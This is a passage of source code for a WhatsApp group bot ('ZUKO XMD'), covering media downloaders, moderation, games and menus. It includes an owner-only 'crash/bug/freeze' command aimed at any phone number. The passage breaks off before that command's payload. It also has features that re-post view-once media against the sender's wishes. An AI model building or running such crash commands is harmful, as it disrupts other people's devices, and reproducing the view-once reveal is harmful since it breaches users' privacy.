                    externalAdReply: {
                        title: 'Catbox Uploader',
                        body: 'File uploaded successfully',
                        mediaType: 1
                    }
                }
            }, { quoted: m });
        } else {
            reply(`❌ Upload failed: ${result || 'Unknown error'}`);
        }
        
    } catch (e) {
        console.error('URL upload error:', e);
        reply(`❌ Upload failed: ${e.message || 'Connection error'}`);
    }
}
async function getEliteProTechDownload(youtubeUrl) {
    const apiUrl = `https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(youtubeUrl)}&format=mp3`;
    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
    if (res?.data?.success && res?.data?.downloadURL) {
        return { download: res.data.downloadURL, title: res.data.title };
    }
    throw new Error('EliteProTech failed');
}

async function getYupraDownload(youtubeUrl) {
    const apiUrl = `https://api.yupra.my.id/api/downloader/ytmp3?url=${encodeURIComponent(youtubeUrl)}`;
    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
    if (res?.data?.success && res?.data?.data?.download_url) {
        return { download: res.data.data.download_url, title: res.data.data.title };
    }
    throw new Error('Yupra failed');
}

async function getOkatsuDownload(youtubeUrl) {
    const apiUrl = `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp3?url=${encodeURIComponent(youtubeUrl)}`;
    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
    if (res?.data?.dl) {
        return { download: res.data.dl, title: res.data.title };
    }
    throw new Error('Okatsu failed');
}

async function getShizoDownload(youtubeUrl) {
    const apiUrl = `https://api.shizo.top/downloader/ytmp3?apikey=shizo&url=${encodeURIComponent(youtubeUrl)}`;
    const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
    if (res?.data?.status && res?.data?.result?.download) {
        return { download: res.data.result.download, title: res.data.result.title };
    }
    throw new Error('Shizo failed');
}

// ========== ANIME FETCH ==========
async function fetchAnimeGif(category) {
    if (NEKOSBEST_CATEGORIES.has(category)) {
        try {
            const res = await axios.get(`https://nekos.best/api/v2/${category}`, { timeout: 8000 });
            const r = res.data?.results?.[0];
            if (r?.url) return { url: r.url, anime: r.anime_name || null };
        } catch (e) { /* fall through */ }
    }
    if (WAIFUPICS_CATEGORIES.has(category)) {
        try {
            const res = await axios.get(`https://api.waifu.pics/sfw/${category}`, { timeout: 8000 });
            if (res.data?.url) return { url: res.data.url, anime: null };
        } catch (e) { /* fall through */ }
    }
    return null;
}

async function sendAnimeReaction(empire, m, reply, prefix, args, category, verb, emoji) {
    const target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    const senderName = '@' + m.sender.split('@')[0];
    const data = await fetchAnimeGif(category);
    if (!data) return reply(`❌ Couldn't fetch a ${category} gif right now, try again in a bit.`);
    let caption;
    if (target) {
        caption = `${emoji} ${senderName} ${verb} @${target.split('@')[0]}!`;
    } else {
        caption = `${emoji} ${senderName} ${verb}${args.length ? ' ' + args.join(' ') : '...'}`;
    }
    const mentions = target ? [m.sender, target] : [m.sender];
    try {
        await empire.sendMessage(m.chat, { video: { url: data.url }, gifPlayback: true, caption, mentions }, { quoted: m });
    } catch (e) {
        await empire.sendMessage(m.chat, { image: { url: data.url }, caption, mentions }, { quoted: m }).catch(() => reply('❌ Failed to send the reaction image.'));
    }
}

// ========== DB SAVE ==========
let _saveDBTimer = null;
function saveDB() {
    if (_saveDBTimer) clearTimeout(_saveDBTimer);
    _saveDBTimer = setTimeout(() => {
        try { fs.writeFileSync(dbPath, JSON.stringify(db, null, 2)); }
        catch (err) { console.error('❌ Failed to save database:', err.message); }
    }, 2000);
}

const delay = (ms) => new Promise(r => setTimeout(r, ms));

// ========== AUTO BIO ==========
let autoBioEnabled = true;

async function updateAutoBio(empire) {
    try {
        const now = new Date();
        const h = now.getHours();
        let bio =
            h < 6  ? "🌙 ZUKO XMD Active | Night Mode | 24/7 Online" :
            h < 12 ? "🌅 ZUKO XMD Active | Morning Mode | Ready" :
            h < 18 ? "☀️ ZUKO XMD Active | Afternoon Mode | Full Power" :
                     "🌆 ZUKO XMD Active | Evening Mode | Online";
        const up = process.uptime();
        bio += ` | Up: ${Math.floor(up/86400)}d ${Math.floor((up%86400)/3600)}h`;
        await empire.updateProfileStatus(bio);
        return true;
    } catch (e) { return false; }
}

function startAutoBio(empire) {
    if (global.autoBioInterval) clearInterval(global.autoBioInterval);
    updateAutoBio(empire);
    global.autoBioInterval = setInterval(() => { if (autoBioEnabled) updateAutoBio(empire); }, 30 * 60 * 1000);
}

// ========== STATUS HANDLER ==========
let autoStatusReact = true;
let autoStatusView = true;
let autoMessageReact = false;
const statusReactions = ["❤️","🔥","👍","😢","😂","🙏","💯","✨","🌟","🎉","💪","💝"];
const messageReactions = ["❤️","🔥","👍","✅","💯","🎯","😎"];
const processedStatuses = new Set();
const processedMessages = new Set();

async function handleStatusMessage(empire, msg) {
    try {
        if (msg.key?.remoteJid !== 'status@broadcast') return false;
        const id = msg.key?.id;
        if (processedStatuses.has(id)) return false;
        processedStatuses.add(id);
        if (autoStatusView) await empire.readMessages([msg.key]).catch(() => {});
        if (autoStatusReact) {
            await delay(2000);
            const r = statusReactions[Math.floor(Math.random() * statusReactions.length)];
            await empire.sendMessage('status@broadcast', { react: { text: r, key: msg.key } }).catch(() => {});
        }
        if (processedStatuses.size > 100) [...processedStatuses].slice(0,50).forEach(x => processedStatuses.delete(x));
        return true;
    } catch { return false; }
}

async function handleAutoMessageReact(empire, msg) {
    try {
        if (!autoMessageReact || msg.key?.fromMe || msg.key?.remoteJid === 'status@broadcast') return false;
        if (msg.message?.protocolMessage) return false;
        const id = msg.key?.id;
        if (processedMessages.has(id)) return false;
        processedMessages.add(id);
        await delay(1000);
        const r = messageReactions[Math.floor(Math.random() * messageReactions.length)];
        await empire.sendMessage(msg.key.remoteJid, { react: { text: r, key: msg.key } }).catch(() => {});
        if (processedMessages.size > 500) [...processedMessages].slice(0,250).forEach(x => processedMessages.delete(x));
        return true;
    } catch { return false; }
}

// ========== WELCOME / GOODBYE ==========
async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botNumber) {
    try {
        const { id, participants, action } = update;
        const welcomeEnabled = getSetting(id, 'welcome', false);
        const goodbyeEnabled = getSetting(id, 'goodbye', false);
        const antibotEnabled = getSetting(id, 'antibot', false);

        if (action === 'add') {
            for (const p of participants) {
                if (p === botNumber) continue;

                if (antibotEnabled) {
                    const pic = await empire.profilePictureUrl(p, 'image').catch(() => null);
                    if (!pic) {
                        await empire.groupParticipantsUpdate(id, [p], 'remove').catch(() => {});
                        await empire.sendMessage(id, {
                            text: `🤖 @${p.split('@')[0]} was removed automatically — no profile picture (anti-bot heuristic).`,
                            mentions: [p]
                        }).catch(() => {});
                        continue;
                    }
                }

                if (welcomeEnabled) {
                    let msg = getSetting(id, 'welcomeMessage', '👋 Welcome @user to @group!');
                    msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
                    await empire.sendMessage(id, { text: msg, mentions: [p] });
                }
            }
        }
        if (action === 'remove' && goodbyeEnabled) {
            for (const p of participants) {
                if (p === botNumber) continue;
                let msg = getSetting(id, 'goodbyeMessage', "👋 Goodbye @user, we'll miss you!");
                msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
                await empire.sendMessage(id, { text: msg, mentions: [p] });
            }
        }
    } catch (e) { console.error('Welcome/Goodbye error:', e); }
}

// ========== JAIL SYSTEM ==========
async function isUserJailed(jid, groupId) {
    if (!db.jailed[groupId]) db.jailed[groupId] = {};
    const j = db.jailed[groupId][jid];
    if (!j) return false;
    if (j.until && Date.now() > j.until) { delete db.jailed[groupId][jid]; saveDB(); return false; }
    return true;
}

async function jailUser(empire, groupId, target, reason, duration, moderator) {
    if (!db.jailed[groupId]) db.jailed[groupId] = {};
    const until = duration ? Date.now() + duration * 60000 : null;
    const durationText = duration ? `${duration} minutes` : "Permanent";
    db.jailed[groupId][target] = { reason: reason || "No reason", until, jailedAt: Date.now(), jailedBy: moderator };
    saveDB();
    return { until, durationText };
}

async function unjailUser(groupId, target) {
    if (!db.jailed[groupId]?.[target]) return false;
    delete db.jailed[groupId][target];
    saveDB();
    return true;
}


async function handleAntiSticker(empire, m, isCreator, isAdmins) {
    try {
        if (!m.isGroup || isCreator || isAdmins || !m.message?.stickerMessage) return false;
        if (!getSetting(m.chat, 'antisticker', false)) return false;
        const action = getSetting(m.chat, 'antisticker_action', 'delete');
        await empire.sendMessage(m.chat, { delete: m.key }).catch(() => {});
        if (action === 'warn') {
            await empire.sendMessage(m.chat, { text: `⚠️ @${m.sender.split('@')[0]} stickers not allowed! Warning.`, mentions: [m.sender] });
            const k = `${m.chat}_${m.sender}`;
            db.warns[k] = (db.warns[k] || 0) + 1; saveDB();
            if (db.warns[k] >= 3) { await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); delete db.warns[k]; saveDB(); }
        } else if (action === 'kick') {
            await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
        }
        return true;
    } catch { return false; }
}


// ========== ANTI-TAG ==========
async function handleAntiTag(empire, m, isCreator, isAdmins) {
    try {
        if (!m.isGroup || isCreator || isAdmins) return false;
        if (!getSetting(m.chat, 'antitag', false)) return false;
        
        // Check if message has mentions
        const mentions = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentions.length === 0) return false;
        
        // Check if any mention is the bot
        const botNumber = empire.user.id;
        const hasBotMention = mentions.some(jid => jid === botNumber || jid.includes(botNumber.split('@')[0]));
        
        // Also check if message contains @everyone or @all (text based)
        const body = m.message?.conversation ||
                     m.message?.extendedTextMessage?.text ||
                     m.message?.imageMessage?.caption ||
                     m.message?.videoMessage?.caption || '';
        
        const hasEveryone = /@everyone|@all|@All|@Everyone/i.test(body);
        
        if (!hasBotMention && !hasEveryone) return false;
        
        const action = getSetting(m.chat, 'antitag_action', 'delete');
        
        // Delete the message
        await empire.sendMessage(m.chat, { delete: m.key }).catch(() => {});
        
        if (action === 'warn') {
            await empire.sendMessage(m.chat, { 
                text: `⚠️ @${m.sender.split('@')[0]} tagging is not allowed! Warning.`, 
                mentions: [m.sender] 
            });
            const k = `${m.chat}_${m.sender}`;
            db.warns[k] = (db.warns[k] || 0) + 1; 
            saveDB();
            if (db.warns[k] >= 3) { 
                await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); 
                delete db.warns[k]; 
                saveDB();
                await empire.sendMessage(m.chat, { 
                    text: `👢 @${m.sender.split('@')[0]} kicked for 3 warnings.`, 
                    mentions: [m.sender] 
                });
            }
        } else if (action === 'kick') {
            await empire.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
            await empire.sendMessage(m.chat, { 
                text: `👢 @${m.sender.split('@')[0]} kicked for tagging.`, 
                mentions: [m.sender] 
            });
        } else {
            await empire.sendMessage(m.chat, { 
                text: `🚫 @${m.sender.split('@')[0]} tagging is not allowed here.`, 
                mentions: [m.sender] 
            }).catch(() => {});
        }
        return true;
    } catch (e) { 
        console.error('Anti-tag error:', e);
        return false; 
    }
}

async function handleAntiViewOnce(empire, m) {
    try {
        if (!m.isGroup || !getSetting(m.chat, 'antiviewonce', false)) return false;
        const msg = m.message;
        if (!msg) return false;
        const voKey = Object.keys(msg).find(k => k.startsWith('viewOnce'));
        if (!voKey) return false;
        const inner = msg[voKey]?.message;
        if (!inner) return false;
        const mediaType = Object.keys(inner).find(k => k.endsWith('Message'));
        if (!mediaType) return false;
        await empire.sendMessage(m.chat, {
            [mediaType]: inner[mediaType],
            caption: `👁️ *Anti-ViewOnce* | By @${m.sender.split('@')[0]}`,
            mentions: [m.sender]
        }).catch(() => {});
        return true;
    } catch { return false; }
}

// ========== DOWNLOAD HELPER ==========
async function downloadMedia(m, type) {
    const msgType = getContentType(m.message);
    const msg = m.message?.[msgType] || m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.[msgType];
    if (!msg) return null;
    const stream = await downloadContentFromMessage(msg, type);
    let buf = Buffer.alloc(0);
    for await (const chunk of stream) buf = Buffer.concat([buf, chunk]);
    return buf;
}

// ========== FUN DATA ==========
const eightBallResponses = [
    "🎱 It is certain!", "🎱 Without a doubt!", "🎱 Yes, definitely!",
    "🎱 You may rely on it.", "🎱 As I see it, yes.", "🎱 Most likely.",
    "🎱 Outlook good.", "🎱 Signs point to yes.", "🎱 Reply hazy, try again.",
    "🎱 Ask again later.", "🎱 Better not tell you now.", "🎱 Cannot predict now.",
    "🎱 Concentrate and ask again.", "🎱 Don't count on it.", "🎱 My reply is no.",
    "🎱 My sources say no.", "🎱 Outlook not so good.", "🎱 Very doubtful.",
    "🎱 Absolutely not!", "🎱 Nope, no way!"
];

const truthQuestions = [
    "What's your biggest fear?", "What's the most embarrassing thing you've done?",
    "Do you have a crush on anyone in this group?", "What's a secret you've never told anyone?",
    "What's the most childish thing you still do?", "Have you ever lied to your best friend?",
    "What's the worst thing you've done and got away with?", "What's your biggest regret?",
    "Have you ever cheated on a test?", "What's the most awkward moment of your life?"
];

const dareActions = [
    "Send a voice note singing any song 🎵", "Change your WhatsApp status to 'I love ZUKO XMD' for 1 hour",
    "Send the last photo in your gallery 📷", "Write a poem about the person above you",
    "Send a selfie right now 🤳", "Do 20 push-ups and record it 💪",
    "Call the last person you texted and say 'I love you'", "Speak in a funny accent for the next 5 minutes",
    "Send a voice note of your best animal sound 🐾", "Let someone in the group change your DP for 1 day"
];

const rpsChoices = { rock: "🪨 Rock", paper: "📄 Paper", scissors: "✂️ Scissors" };

// ========== MENU THEMES ==========
const THEMES = {
    classic: { name: 'Classic',        bullet: '║', title: (t) => `🌟━━━━━━━━━━━━━━━━━━━━━━🌟\n   ${t}\n🌟━━━━━━━━━━━━━━━━━━━━━━🌟`, rule: '━━━━━━━━━━━━━━━━━━━━━━━━' },
    aurora:  { name: 'Aurora Grid',    bullet: '◈', title: (t) => `◆ ⟦ ${t} ⟧`,                                                    rule: '┄┈┄┈┄┈┄┈┄┈┄┈┄┈┄┈┄┈┄┈┄┈┄┈┄┈┄┈' },
    cipher:  { name: 'Cipher Terminal',bullet: '›', title: (t) => `⌁ \`[ ${t} ]\``,                                                rule: '▓▒░░▒▓▓▒░░▒▓▓▒░░▒▓▓▒░░▒▓▓▒░░▒▓' },
    neon:    { name: 'Neon Pulse',     bullet: '➤', title: (t) => `⚡『 ${t} 』⚡`,                                                  rule: '▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬' },
    royal:   { name: 'Royal Gold',     bullet: '✦', title: (t) => `👑 【 ${t} 】 👑`,                                               rule: '━━━━━━━━━━━━━━━━━━━━━━━━━━━━' },
};

const getUserTheme = (jid) => (THEMES[getSetting(jid, 'menuTheme', 'classic')] ? getSetting(jid, 'menuTheme', 'classic') : 'classic');

// ========== MENU CATEGORIES ==========
const MENU_CATEGORIES = [
    { num: 1, emoji: '⚙️', title: 'GENERAL', items: [
        ['ping', 'latency check'],
        ['uptime', 'bot runtime'],
        ['menu / help', 'this menu'],
        ['theme', 'change menu look'],
    ]},
    { num: 2, emoji: '🎨', title: 'MEDIA', items: [
        ['sticker', 'img/vid → sticker'],
        ['imgsticker', 'image → sticker (reply to image)'],
        ['toaudio', 'vid → audio'],
        ['toptt', 'vid/audio → voice note'],
        ['tomp4', 'sticker → mp4'],
        ['getpp', 'get profile picture'],
        ['setpp', 'set profile picture (reply to image)'],
        ['setgpp', 'set group profile picture'],
    ]},
    { num: 3, emoji: '👥', title: 'GROUP MANAGEMENT', items: [
        ['mute / unmute', 'lock / unlock chat'],
        ['kick @user', 'remove member'],
        ['promote @user', 'make admin'],
        ['demote @user', 'remove admin'],
        ['add <number>', 'invite a member'],
        ['warn @user <reason>', 'add a warning'],
        ['unwarn @user', 'clear warnings'],
        ['warns @user', 'check warnings'],
        ['tagall <msg>', 'tag everyone'],
        ['tagadmins <msg>', 'tag admins'],
        ['hidetag <msg>', 'silently tag everyone'],
        ['groupinfo', 'group details'],
        ['setname <name>', 'change group name'],
        ['setdesc <desc>', 'change group description'],
        ['setppic', 'set group photo (reply to image)'],
        ['grouplink', 'get invite link'],
        ['revokelink', 'reset invite link'],
        ['poll Q | opt1 | opt2', 'create a poll'],
    ]},
    { num: 4, emoji: '🛡️', title: 'PROTECTIONS', items: [
        ['antilink on/off', 'block group links'],
        ['antisticker on/off', 'block stickers'],
        ['antidelete on/off', 'log deleted messages'],
        ['antiviewonce on/off', 'reveal view-once media'],
        ['anticall on/off', 'reject incoming calls'],
        ['antibot on/off', 'auto-kick suspicious joins'],
    ]},
    { num: 5, emoji: '🔒', title: 'JAIL SYSTEM', items: [
        ['jail @user <reason> [mins]', 'restrict a user'],
        ['unjail @user', 'release a user'],
        ['jaillist', 'view jailed users'],
    ]},
    { num: 6, emoji: '🎉', title: 'EVENTS', items: [
        ['welcome on/off', 'toggle welcome message'],
        ['setwelcome <msg>', 'customize welcome message'],
        ['goodbye on/off', 'toggle goodbye message'],
        ['setgoodbye <msg>', 'customize goodbye message'],
    ]},
    { num: 7, emoji: '🎲', title: 'FUN & GAMES', items: [
        ['8ball <question>', 'magic 8-ball'],
        ['truth', 'truth question'],
        ['dare', 'dare challenge'],
        ['rps <rock/paper/scissors>', 'play rock-paper-scissors'],
        ['coinflip', 'flip a coin'],
        ['dice', 'roll a dice'],
        ['joke', 'random joke'],
        ['quote', 'inspirational quote'],
        ['meme', 'random meme'],
        ['ship @user', 'love compatibility meter'],
        ['quiz', 'trivia question'],
        ['fact', 'random fact'],
        ['advice', 'random advice'],
        ['dadjoke', 'dad joke'],
        ['catfact', 'cat fact'],
        ['cat', 'random cat picture'],
        ['dog', 'random dog picture'],
        ['compliment', 'get a compliment'],
    ]},
    { num: 8, emoji: '🎵', title: 'MUSIC', items: [
        ['play <song name>', 'search & send audio'],
        ['ytsearch <query>', 'search YouTube'],
        ['tts <text>', 'text to speech'],
        ['lyrics <song name>', 'get song lyrics'],
        ['ytb <url/name>', 'download YouTube video'],
        ['spotify <name/url>', 'download Spotify track'],
        ['fbdl <url>', 'download Facebook video'],
        ['ig <url>', 'download Instagram media'],
        ['tt <url>', 'download TikTok video'],
        ['tw <url>', 'download Twitter/X media'],
        ['aio <url>', 'auto-detect & download'],
    ]},
    { num: 9, emoji: '🌍', title: 'TOOLS', items: [
        ['weather <city>', 'weather report'],
        ['translate <lang> <text>', 'translate text'],
        ['calc <expression>', 'calculator'],
        ['define <word>', 'dictionary lookup'],
        ['urban <word>', 'urban dictionary lookup'],
        ['qr <text/link>', 'generate a QR code'],
        ['shorturl <link>', 'shorten a link'],
        ['ssweb <url>', 'screenshot a website'],
        ['currency <amt> <from> <to>', 'convert currency'],
        ['myid', 'show your/group ID'],
        ['owner', 'contact the owner'],
    ]},
    { num: 10, emoji: '🤖', title: 'AI & BOT', items: [
        ['ai <question>', 'AI chat (Shizo GPT)'],
        ['aiclear', 'clear AI conversation history'],
        ['imagine <prompt>', 'generate AI image'],
        ['autobio on/off/now', 'auto status bio'],
        ['autoreact on/off', 'auto message react'],
        ['pair <number>', 'link a new device'],
    ]},
    { num: 11, emoji: '💰', title: 'ECONOMY', items: [
        ['balance / bal', 'check wallet & bank'],
        ['daily', 'claim daily reward'],
        ['work', 'earn coins (1h cooldown)'],
        ['shop', 'view items for sale'],
        ['shop buy <item_id>', 'purchase an item'],
        ['deposit <amt/all>', 'wallet → bank'],
        ['withdraw <amt/all>', 'bank → wallet'],
        ['transfer @user <amt>', 'send coins'],
        ['leaderboard / lb', 'top 10 richest'],
        ['slot <bet>', 'slot machine'],
        ['coinflip <bet>', 'bet on a coin flip'],
    ]},
];

function renderMainMenu(theme, prefix, userName, now, date, upStr) {
    const t = THEMES[theme];
    const catList = MENU_CATEGORIES.map(c => `${t.bullet} *${c.num}.* ${c.emoji} ${c.title}`).join('\n');
    return `${t.title('𝕫𝕦𝕜𝕠 ✗𝕞𝕕 — COMMAND MENU')}

👤 *User:* ${userName}
🕐 *Time:* ${now}
📅 *Date:* ${date}
⚡ *Uptime:* ${upStr}
🔋 *Status:* ONLINE ✅

${t.rule}
📂 *CATEGORIES*

${catList}

${t.rule}
💡 View a category: ${prefix}menu <number>
🎨 Change this look: ${prefix}theme

${t.rule}
  💎 *ZUKO XMD v2.0* | 🥷 DEV ZUKO`;
}

function renderCategoryMenu(theme, prefix, category) {
    const t = THEMES[theme];
    const items = category.items.map(([cmd, desc]) => `${t.bullet} ${prefix}${cmd} — ${desc}`).join('\n');
    return `${t.title(`${category.emoji} ${category.title}`)}

${items}

${t.rule}
↩️ Back to menu: ${prefix}menu`;
}

// ========== MAIN BOT ==========
module.exports = empire = async (empire, m, chatUpdate, store) => {
    try {
        if (!global.autoBioStarted) { global.autoBioStarted = true; startAutoBio(empire); }

        await handleAutoMessageReact(empire, m);
        await handleStatusMessage(empire, m);

        const body = m.message?.conversation ||
                     m.message?.extendedTextMessage?.text ||
                     m.message?.imageMessage?.caption ||
                     m.message?.videoMessage?.caption || "";

        const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body)
            ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi)[0]
            : '/';

        const isCmd = body.startsWith(prefix);
        const args = body.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        const text = args.join(" ");

        const botNumber = await empire.decodeJid(empire.user.id);
        const owner = JSON.parse(fs.readFileSync('./allfunc/owner.json'));

        const senderPn = (m.sender || '').endsWith('@lid')
            ? (m.key?.participantPn || m.key?.senderPn || m.sender)
            : m.sender;

        const isCreator = [botNumber, ...owner]
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
            .includes(senderPn);

        const isGroup = m.isGroup;
        let groupMetadata, participants = [], groupAdmins = [], isBotAdmins = false, isAdmins = false, groupName = "";
if (m.message?.protocolMessage?.type === 0) {
            await antidelete.handleRevocation(empire, m);
        }
        
        if (isGroup) {
            groupMetadata = await empire.groupMetadata(m.chat).catch(() => null);
            participants = groupMetadata?.participants || [];
            groupAdmins = participants.filter(p => p.admin).map(p => p.id);
            isBotAdmins = groupAdmins.includes(botNumber);
            isAdmins = groupAdmins.includes(m.sender);
            groupName = groupMetadata?.subject || "";
        }

        const reply = (teks) => empire.sendMessage(m.chat, { text: teks }, { quoted: m });

        // Block jailed users
        if (isGroup && !isCreator && !isAdmins) {
            const jailed = await isUserJailed(m.sender, m.chat);
            if (jailed) {
                const j = db.jailed[m.chat]?.[m.sender];
                let msg = `🔒 *You are JAILED!*\n\n📌 Reason: ${j?.reason || 'Unknown'}\n`;
                msg += j?.until ? `⏱️ Remaining: ${Math.ceil((j.until - Date.now()) / 60000)} minutes` : `⏱️ PERMANENT`;
                msg += `\n\n❌ Contact an admin to be released.`;
                await empire.sendMessage(m.chat, { delete: m.key }).catch(() => {});
                await empire.sendMessage(m.chat, { text: msg, mentions: [m.sender] }).catch(() => {});
                return;
            }
        }

       
        await handleAntiSticker(empire, m, isCreator, isAdmins);
        
        await handleAntiViewOnce(empire, m);
        await handleAntiTag(empire, m, isCreator, isAdmins);
// ─── STORE MESSAGES FOR ANTI-DELETE ───
if (!isCreator) {
    await antidelete.storeMessage(empire, m);
}
        if (!isCmd) return;

        switch (command) {

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MENU / HELP
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'menu':
case 'help': {
    const now = moment().tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment().tz('Africa/Lagos').format('DD/MM/YYYY');
    const up = process.uptime();
    const upStr = `${Math.floor(up/86400)}d ${Math.floor((up%86400)/3600)}h ${Math.floor((up%3600)/60)}m`;
    const userName = m.pushName || 'User';
    const theme = getUserTheme(m.sender);

    const sel = args[0]?.toLowerCase();
    let category = null;
    if (sel) {
        category = MENU_CATEGORIES.find(c => String(c.num) === sel) ||
                    MENU_CATEGORIES.find(c => c.title.toLowerCase().includes(sel));
        if (!category) return reply(`❌ Unknown category. Try ${prefix}menu to see the list.`);
    }

    const menuText = category
        ? renderCategoryMenu(theme, prefix, category)
        : renderMainMenu(theme, prefix, userName, now, date, upStr);

    try {
        let imagePayload;
        if (Buffer.isBuffer(global.menuImage)) {
            imagePayload = { image: global.menuImage };
        } else if (typeof global.menuImage === 'string' && global.menuImage.startsWith('http')) {
            imagePayload = { image: { url: global.menuImage } };
        } else {
            imagePayload = { image: { url: 'https://telegra.ph/file/9e7e4a5f8c3d2b1a6f0c8.jpg' } };
        }
        await empire.sendMessage(m.chat, {
            ...imagePayload,
            caption: menuText,
            contextInfo: newsletterContext({ mentionedJid: [m.sender] })
        }, { quoted: m });
    } catch (e) {
        await empire.sendMessage(m.chat, {
            text: menuText,
            contextInfo: newsletterContext()
        }, { quoted: m });
    }
    break;
}
// In your main switch, add:
case 'viewonce':
case 'vo':
case 'reveal': {
    if (!isCreator) return reply('❌ Owner only!');
    const ownerJid = owner[0] || botNumber;
    const ownerNum = ownerJid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await viewonceCommand(empire, m.chat, m, ownerNum, botNumber);
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-TAG
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'antitag':
case 'at': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { 
        setSetting(m.chat, 'antitag', true); 
        setSetting(m.chat, 'antitag_action', 'delete'); 
        reply(`🚫 *ANTI-TAG ON*\nTagging others will be deleted.\n\nChange action: ${prefix}antitag action <delete/warn/kick>`); 
    } else if (opt === 'off') { 
        setSetting(m.chat, 'antitag', false); 
        reply(`✅ *ANTI-TAG OFF*`); 
    } else if (opt === 'action') {
        const a = args[1]?.toLowerCase();
        if (['delete','warn','kick'].includes(a)) { 
            setSetting(m.chat, 'antitag_action', a); 
            reply(`✅ Anti-tag action: *${a.toUpperCase()}*`); 
        } else reply(`Actions: delete, warn, kick`);
    } else {
        const s = getSetting(m.chat, 'antitag', false);
        const a = getSetting(m.chat, 'antitag_action', 'delete');
        reply(`🚫 *ANTI-TAG*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'} | Action: ${a.toUpperCase()}\n\n${prefix}antitag on/off\n${prefix}antitag action <delete/warn/kick>`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  XEON UI — CRASH / BUG COMMAND
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'zuko':
case 'crash':
case 'bug':
case 'freeze': {
    if (!isCreator) return reply('❌ *Only the bot owner can use this command.*');
    
    const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.chat;
    if (!target) return reply(`👉 *Usage:* ${prefix}xeon <jid>\nExample: ${prefix}xeon 6281234567890`);
    
    // Get thumbnail buffer from menu image or use default
    let thumbBuffer = global.menuImage;
    if (Buffer.isBuffer(thumbBuffer)) {
        thumbBuffer = thumbBuffer.toString('base64');
    } else {
        // Fallback thumbnail (base64 of a small image)
        thumbBuffer = '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAGQAZAMBIgACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAAAAQIDBAUGB//EADsQAAIBAgQDBgUDAwQDAAAAAAABAgMRBBIhMQVBYSIyUXGBkRNCobHB0fAGI1LhM0NicpLC8RUk/8QAGAEBAQEBAQAAAAAAAAAAAAAAAAECAwT/xAAeEQEBAQADAQEBAQEAAAAAAAAAARECEiExQQNRIv/aAAwDAQACEQMRAD8A8cJVctbCFbuuhZUbZFiK2rMrm9uZKT3uxt2sJ3uC0y0PZqXW4zIbsWpICb2EAnKwk7hcYxMRW6Ck7sEWK1iC3BstSG1IacSuUmTpd1DexWpO4N6Cgc7LUTu+Q3boKLC7dAV+hTUPpS4rTv3oJdDdQ4ng63cqlXDawvHEVOW+qPRyc5PjV8qGOrQpUZvK4xir7e5nxYjyE3ZkE7rUfTsqo0rRsWSkkrpeSASqxT1SLKSzztKSitdfInPBVWruU3/pZPWzTv4lSjKEmpxcZLwkgbthk1FpabK4N3d0rdBOV97hmu7sm2BdktISLJxi7d0rVgAohq7Fk4pyGtHYAFKKTIJadC2aTQSV0gFqKbYxWIcC1aiK7s7k5d1lVLukr3QnO1r6DbUouDs1dNWep5nGcHxFKpOphJyeR2yPVo+hKj2cVVi925N28CajznDqGPo4hpYWo4vv2Vy3FYmWHqVPhuUJSbk4vqeqrVqlPHYZU52i3dpK126eCtcwcf4XUxkZZJQgs7csz1a+VEZtx5mrxOc92n5lUeNVKb/tqGnp1LOK8E4hgsQpRgsRTlJRjKmm9fE2f/AA+OVKpmrU6lWjK0qtGLu1zyrqvzFlsKmrVg4xer6cxd1XW19SJg8FVp0r13lL5q1wA6mDyZVbl0NGWJyMPVfcoJtnUjGoo9qojSRZRq4daSlBqWlprTzPByeLwtZr41Sk+bg3Fm7heIq168cPJ/EcttWn6nHrV14rm4GLcK8ktJehVwqVWs5Ryzp0497N3m2fRKOApRlaNXDU6kNo1HZ+5GXE8Th8RWoSw